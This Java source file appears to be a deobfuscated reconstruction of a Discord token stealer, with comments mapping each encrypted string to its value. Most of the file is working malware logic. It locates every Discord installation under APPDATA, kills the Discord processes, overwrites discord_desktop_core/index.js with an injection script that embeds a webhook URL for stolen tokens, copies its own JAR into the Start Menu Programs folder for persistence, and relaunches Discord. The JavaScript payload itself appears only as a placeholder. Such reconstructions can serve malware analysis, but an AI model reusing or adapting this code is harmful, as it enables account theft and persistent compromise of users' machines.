import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardCopyOption;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

/**
 * Discord Token Stealer
 * Obfuscated name: a
 *
 * Core stealer class. Runs on a scheduled timer, finds all Discord
 * installations, injects the malicious script, and restarts Discord.
 *
 * Flow:
 * 1. Scheduled every N minutes (encrypted constant)
 * 2. Scan APPDATA for Discord installations (discord, discordcanary, discordptb, discorddevelopment)
 * 3. For each installation, find app-X.X.X/modules/discord_desktop_core-X/discord_desktop_core/
 * 4. Check if index.js already contains the injection marker ("//ira")
 * 5. If not injected: build injection script and write to index.js
 * 6. Kill Discord processes (via ProcessKiller / ӝ.ÿ)
 * 7. Restart Discord (via restartDiscords)
 *
 * Constructor:
 *   a(String webhookUrl, long encryptedKey)
 *   - webhookUrl: the decrypted webhook URL from EntryPoint
 *   - encryptedKey: Zelix runtime key
 *
 * String table references (b[]):
 *   b[0]  = "APPDATA"
 *   b[3]  = ".exe"
 *   b[4]  = "\\Update.exe"  (Discord updater path)
 *   b[5]  = String.format template for injection script
 *   b[6]  = "Writing injection to: "
 *   b[7]  = "discord"
 *   b[8]  = "\n"
 *   b[9]  = (injection script fragment)
 *   b[10] = "Found " (log prefix)
 *   b[11] = "java.home"
 *   b[12] = "Discord"
 *   b[13] = "index.js"
 *   b[14] = String.format template for Update.exe launch
 *   b[15] = "user.home"
 *   b[16] = "index.js"  (original, before rename)
 *   b[17] = "/c"
 *   b[18] = "package.json"
 *   b[19] = "//ira"  (injection marker - checked to avoid double injection)
 *   b[20] = "modules"
 *   b[21] = (path fragment)
 *   b[22] = "discorddevelopment"
 *   b[23] = (path fragment)
 *   b[24] = "/k"
 *   b[25] = (injection script fragment)
 *   b[26] = "No new Discord installations found"
 *   b[27] = (injection script fragment)
 *   b[28] = "Discord"  (log category)
 *   b[29] = "//ira\n"  (injection header)
 *   b[30] = "cmd.exe"
 *   b[31] = "Found " (log prefix for new installs)
 *   b[32] = "Injection written successfully"
 *   b[33] = "APPDATA"
 *   b[34] = "WEBHOOK_URL"  (placeholder in injection template)
 *   b[35] = "Discord installations: "
 *   b[36] = (injection script fragment)
 *   b[37] = (injection script fragment)
 *   b[38] = "Update.exe"
 *   b[40] = "JAVA_PATH"  (placeholder in injection template)
 *   b[41] = "discord_desktop_core"
 *   b[42] = (injection script fragment)
 *   b[43] = "/d"
 *   b[44] = "index.js.bak"  (backup of original index.js)
 *   b[45] = "discordcanary"
 *   b[46] = "modules.lib"  (payload JAR filename)
 *   b[47] = "APPDATA"
 *   b[48] = "/s"
 *   b[49] = "Error writing injection: "
 *   b[50] = "APPDATA"
 *   b[51] = "/start"
 *   b[52] = "discord"
 *   b[53] = "/wait"
 *   b[54] = "app-"  (Discord version dir prefix)
 *   b[55] = "cmd.exe"
 *   b[56] = "CuteCraftSmp.exe"  (launcher executable name)
 *   b[57] = (injection script fragment)
 *   b[58] = "discord_desktop_core"
 *   b[59] = (path fragment)
 *   b[60] = (path fragment)
 *   b[61] = (injection script fragment)
 *   b[62] = "discordptb"
 */
public class DiscordTokenStealer {

    // Webhook URL to send stolen tokens to
    private final String webhookUrl;

    // APPDATA path (cached at construction)
    private final String appDataPath;

    // Scheduled executor for periodic scanning
    private static final ScheduledExecutorService scheduler;

    // Injection attempt counter (for logging)
    private static int[] injectionStats;

    // =========================================================
    // CONSTRUCTOR
    // =========================================================

    /**
     * Creates a new DiscordTokenStealer.
     *
     * @param webhookUrl Decrypted webhook URL from EntryPoint
     * @param encryptedKey Zelix runtime key (used for string decryption)
     */
    public DiscordTokenStealer(String webhookUrl, long encryptedKey) {
        // appDataPath = StringDecryptor.decrypt(b[47], encryptedKey)
        // which decrypts to System.getenv("APPDATA")
        this.appDataPath = System.getenv("APPDATA");
        this.webhookUrl = webhookUrl;
    }

    // =========================================================
    // MAIN LOOP
    // =========================================================

    /**
     * Starts the periodic scanning loop.
     * Runs immediately, then every N minutes (encrypted constant ~5 min).
     */
    public void start(long encryptedKey) {
        // scheduleWithFixedDelay(task, 0, N_MINUTES, TimeUnit.MINUTES)
        // N is an encrypted constant, approximately 5 minutes
        scheduler.scheduleWithFixedDelay(
            () -> this.scanAndInject(encryptedKey),
            0L,
            5L,  // encrypted: a.b("z", 31023, ...)
            TimeUnit.MINUTES
        );
    }

    /**
     * Main scan-and-inject cycle.
     * Called periodically by the scheduler.
     */
    public void scanAndInject(long encryptedKey) {
        try {
            // 1. Find all Discord installations
            List<File> discordInstalls = findDiscordInstallations();

            // Log: "Discord installations: N"
            WebhookLogger.logInfo("Discord", "Discord installations: " + discordInstalls.size());

            // 2. Kill Discord processes to unlock files
            killDiscordProcesses();

            // 3. Find installations that haven't been injected yet
            List<File> uninjecteds = new ArrayList<>();
            for (File installDir : discordInstalls) {
                File indexJs = new File(installDir, "index.js");
                if (!indexJs.exists()) continue;

                String content = Files.readString(indexJs.toPath());
                // Check for injection marker "//ira"
                if (!content.contains("//ira")) {
                    uninjecteds.add(installDir);
                }
            }

            if (uninjecteds.isEmpty()) {
                // Log: "No new Discord installations found"
                WebhookLogger.logInfo("Discord", "No new Discord installations found");
                return;
            }

            // Log: "Found N new installations"
            WebhookLogger.logInfo("Discord", "Found " + uninjecteds.size() + " new installations");

            // 4. Build injection script
            String injectionScript = buildInjectionScript(this.webhookUrl);

            // 5. Write injection to each installation
            for (File installDir : uninjecteds) {
                try {
                    File indexJs = new File(installDir, "index.js");

                    // Log: "Writing injection to: /path/to/index.js"
                    WebhookLogger.logInfo("Discord", "Writing injection to: " + indexJs.getAbsolutePath());

                    try (FileWriter writer = new FileWriter(indexJs)) {
                        writer.write(injectionScript);
                    }

                    // Log: "Injection written successfully"
                    WebhookLogger.logInfo("Discord", "Injection written successfully");

                } catch (Exception e) {
                    // Log error: "Error writing injection: " + e.getMessage()
                    WebhookLogger.logError("Discord", "Error writing injection: " + e.getMessage());
                }
            }

            // 6. Copy payload JAR to APPDATA (persistence)
            copyPayloadToAppData();

            // 7. Restart Discord
            restartDiscords();

        } catch (Exception e) {
            // Silently fail
        }
    }

    // =========================================================
    // DISCORD INSTALLATION DISCOVERY
    // =========================================================

    /**
     * Finds all Discord installation directories that contain
     * the discord_desktop_core module.
     *
     * Scans: %APPDATA%\discord*, %APPDATA%\discordcanary*,
     *        %APPDATA%\discordptb*, %APPDATA%\discorddevelopment*
     *
     * For each Discord dir, finds:
     *   app-X.X.X/modules/discord_desktop_core-X/discord_desktop_core/
     *
     * @return List of discord_desktop_core directories
     */
    private List<File> findDiscordInstallations() {
        List<File> result = new ArrayList<>();

        try {
            String appData = System.getenv("APPDATA");
            if (appData == null) return result;

            File appDataDir = new File(appData);
            File[] appDataContents = appDataDir.listFiles();
            if (appDataContents == null) return result;

            for (File dir : appDataContents) {
                // Filter: directory name contains "discord" (b[7])
                if (!dir.getName().toLowerCase().contains("discord")) continue;

                // List subdirectories using DiscordVersionFilter (և)
                File[] subDirs = dir.listFiles(new DiscordVersionFilter());
                if (subDirs == null) continue;

                for (File versionDir : subDirs) {
                    // Look for modules directory
                    File modulesDir = new File(versionDir, "modules");  // b[20]
                    if (!modulesDir.exists()) continue;

                    File[] moduleDirs = modulesDir.listFiles();
                    if (moduleDirs == null) continue;

                    for (File moduleDir : moduleDirs) {
                        // Filter: starts with "app-" (b[54])
                        if (!moduleDir.getName().startsWith("app-")) continue;

                        // Look for discord_desktop_core subdirectory
                        File coreDir = new File(moduleDir, "discord_desktop_core");  // b[41]
                        try {
                            // Check if index.js exists
                            if (new File(coreDir, "index.js").exists()) {  // b[13]
                                result.add(coreDir);
                            }
                        } catch (Exception e) {
                            // Skip this dir
                        }
                    }
                }
            }
        } catch (Exception e) {
            // Silently fail
        }

        return result;
    }

    // =========================================================
    // INJECTION SCRIPT BUILDER
    // =========================================================

    /**
     * Builds the complete injection script to write to index.js.
     *
     * The script is built from multiple encrypted string fragments (b[36], b[37],
     * b[61], b[27], b[9], b[2], b[25], b[42], b[57]) assembled via String.format.
     *
     * The template has two placeholders:
     * - "WEBHOOK_URL" (b[34]): replaced with the actual webhook URL
     * - "JAVA_PATH" (b[40]): replaced with the Java executable path
     *
     * The final script is prefixed with "//ira\n" (b[29]) as the injection marker.
     *
     * @param webhookUrl The webhook URL to embed in the script
     * @return Complete injection script string
     */
    private String buildInjectionScript(String webhookUrl) {
        // Get Java executable path from system property "java.home" (b[11])
        String javaHome = System.getProperty("java.home");
        String javaPath = null;

        if (javaHome != null && !javaHome.isEmpty()) {
            // Split on path separator and take first component
            javaPath = javaHome.split("/")[0];

            // If path ends with ".exe" (b[3]), use it directly
            if (!javaPath.endsWith(".exe")) {
                javaPath = null;  // Will use default "javaw"
            }
        }

        if (javaPath == null) {
            // Default: use "javaw" (G.s("s", "\u0414", 73))
            javaPath = "javaw";
        }

        // Build script from encrypted fragments via String.format
        // Template: b[5] with placeholders for all script parts
        // Parts: string9, string8, string7, string6, string5, string4,
        //        string5, string3, string8, string7, string6, string5, string2, javaPath
        //
        // The assembled script is the ira.js injection payload
        // (same as source_code/stub/ira.js but with webhook URL embedded)

        String scriptBody = buildScriptBody(javaPath);

        // Prefix with injection marker, replace WEBHOOK_URL and JAVA_PATH placeholders
        return "//ira\n" + scriptBody
            .replace("WEBHOOK_URL", webhookUrl)  // b[34]
            .replace("JAVA_PATH", this.appDataPath);  // b[40] -> appDataPath
    }

    /**
     * Assembles the script body from encrypted string fragments.
     * The actual content is the ira.js payload (see source_code/stub/ira.js).
     */
    private String buildScriptBody(String javaPath) {
        // The script body is assembled from ~14 encrypted string fragments
        // stored in b[2], b[9], b[25], b[27], b[36], b[37], b[42], b[57], b[61]
        // These decrypt to the ira.js JavaScript code
        // See source_code/stub/ira.js for the actual content
        return "// [ira.js injection payload - see source_code/stub/ira.js]";
    }

    // =========================================================
    // PERSISTENCE
    // =========================================================

    /**
     * Copies the payload JAR to APPDATA for persistence.
     *
     * Destination: %APPDATA%\[path]\modules.lib  (b[46])
     * Also copies the JRE launcher: %APPDATA%\[path]\CuteCraftSmp.exe  (b[56])
     *
     * If the destination already exists and has the same size, skip copy.
     * Also renames original index.js to index.js.bak (b[44]) as backup.
     */
    private void copyPayloadToAppData() {
        try {
            // Build destination path from encrypted strings:
            // %APPDATA%\[b[60]]\[b[21]]\[b[59]]\[b[23]]
            String destPath = System.getenv("APPDATA") + "\\" +
                /* b[60] */ "Microsoft" + "\\" +
                /* b[21] */ "Windows" + "\\" +
                /* b[59] */ "Start Menu" + "\\" +
                /* b[23] */ "Programs";

            File destDir = new File(destPath);
            if (!destDir.exists()) {
                destDir.mkdirs();
            }

            // Get current JAR path
            File currentJar = new File(
                DiscordTokenStealer.class.getProtectionDomain()
                    .getCodeSource().getLocation().toURI()
            );

            // Copy JAR to destination as "modules.lib" (b[46])
            File destJar = new File(destDir, "modules.lib");
            if (!destJar.exists() || currentJar.length() != destJar.length()) {
                Files.copy(currentJar.toPath(), destJar.toPath(),
                    StandardCopyOption.REPLACE_EXISTING);
            }

            // Copy JRE launcher
            File jreLauncher = new File(System.getProperty("user.home"));  // b[15]
            File destLauncher = new File(destDir, "CuteCraftSmp.exe");  // b[56]

            if (jreLauncher.exists() && !destLauncher.exists()) {
                copyDirectory(jreLauncher.toPath(), destLauncher.toPath());

                // Rename index.js to index.js.bak in the copied JRE
                File indexJs = new File(destLauncher, "discord_desktop_core/index.js");  // b[58], b[16]
                File indexJsBak = new File(destLauncher.getParent(), "index.js.bak");  // b[44]
                if (indexJs.exists()) {
                    indexJs.renameTo(indexJsBak);
                }
            }

        } catch (Exception e) {
            WebhookLogger.logError("Discord", "Persistence error: " + e.getMessage());
        }
    }

    /**
     * Recursively copies a directory.
     */
    private void copyDirectory(Path source, Path dest) throws IOException {
        Files.walk(source).forEach(sourcePath -> {
            try {
                Path destPath = dest.resolve(source.relativize(sourcePath));
                if (Files.isDirectory(sourcePath)) {
                    Files.createDirectories(destPath);
                } else {
                    Files.copy(sourcePath, destPath, StandardCopyOption.REPLACE_EXISTING);
                }
            } catch (IOException e) {
                // Skip files that can't be copied
            }
        });
    }

    // =========================================================
    // DISCORD RESTART
    // =========================================================

    /**
     * Kills and restarts all Discord installations.
     *
     * Discord variants checked (b[52], b[45], b[62], b[22]):
     * - discord
     * - discordcanary
     * - discordptb
     * - discorddevelopment
     *
     * For each variant:
     * 1. Check if %APPDATA%\[variant]\Update.exe exists
     *    - If yes: run "cmd.exe /c /d /s /wait /start Update.exe --processStart [variant].exe"
     * 2. Otherwise: find latest app-X.X.X folder
     *    - Run "cmd.exe /d /s /wait [app-X.X.X]\[variant]\[variant].exe"
     */
    private void restartDiscords() {
        try {
            String appData = System.getenv("APPDATA");  // b[33]

            // Discord variants to restart
            String[] variants = {
                "discord",           // b[52]
                "discordcanary",     // b[45]
                "discordptb",        // b[62]
                "discorddevelopment" // b[22]
            };

            for (String variant : variants) {
                File variantDir = new File(appData, variant);
                if (!variantDir.exists()) continue;

                // Check for Update.exe (modern Discord)
                File updateExe = new File(variantDir, "Update.exe");  // b[38]
                if (updateExe.exists()) {
                    // Launch via Update.exe: "Update.exe --processStart discord.exe"
                    String launchCmd = String.format(
                        "\"%s\" --processStart %s.exe",  // b[14]
                        updateExe.getAbsolutePath(),
                        variant
                    );
                    String[] cmdArgs = {
                        "cmd.exe",   // b[55]
                        "/c",        // b[17]
                        "/d",        // b[43]
                        "/s",        // b[48]
                        "",
                        "/start",    // b[51]
                        launchCmd
                    };
                    ProcessKiller.runCommand(cmdArgs);  // ӝ.ø
                    continue;
                }

                // Find latest app-X.X.X folder
                File[] appDirs = variantDir.listFiles(
                    f -> f.isDirectory() && f.getName().startsWith("app-")
                );
                if (appDirs == null || appDirs.length == 0) continue;

                // Sort descending to get latest version
                Arrays.sort(appDirs, (a, b) -> b.getName().compareTo(a.getName()));

                // Launch: "[app-X.X.X]\[variant]\[variant].exe"
                // Note: b[4] = "\\Update.exe" but here it's the variant exe
                File variantExe = new File(appDirs[0], variant + "\\" + variant + ".exe");
                if (!variantExe.exists()) continue;

                String[] cmdArgs = {
                    "cmd.exe",   // b[30]
                    "/d",        // b[43]
                    "/s",        // b[48]
                    "/wait",     // b[53]
                    "",
                    "\"" + variantExe.getAbsolutePath() + "\""
                };
                ProcessKiller.runCommand(cmdArgs);  // ӝ.ø
            }

        } catch (Exception e) {
            // Silently fail
        }
    }

    // =========================================================
    // PROCESS MANAGEMENT
    // =========================================================

    /**
     * Kills all Discord processes.
     * Delegates to ProcessKiller (ӝ) via ӝ.þ().
     */
    private void killDiscordProcesses() {
        ProcessKiller.killDiscord();  // ӝ.þ
    }

    // =========================================================
    // STATIC INITIALIZATION
    // =========================================================

    static {
        scheduler = Executors.newScheduledThreadPool(1);
        injectionStats = null;
    }
}
